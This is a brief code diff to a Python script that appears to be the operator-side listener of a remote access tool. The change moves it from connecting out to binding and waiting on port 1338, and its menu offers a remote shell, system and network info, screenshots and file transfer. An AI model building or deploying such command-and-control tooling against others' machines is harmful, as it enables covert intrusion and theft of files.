@@ -4,22 +4,25 @@ import fileupload
 import filedownload
 
 # Constants
-HOST = '127.0.0.1'
+HOST = '192.168.1.2'
 PORT = 1338
 MENU = """
 1) List CWD
 2) System info
 3) Network info
 4) Shell
-5) Take desktop screenshot
+5) Take desktop screenshot (For Windows Only)
 6) Get current working directory
 7) Upload a file
 8) Download a file
 00) exit
 """
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect((HOST, PORT))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(5)
+print("[*] Waiting for client connection...")
+connection, address = s.accept()
 print("Type help for menu")
 print(MENU)
 
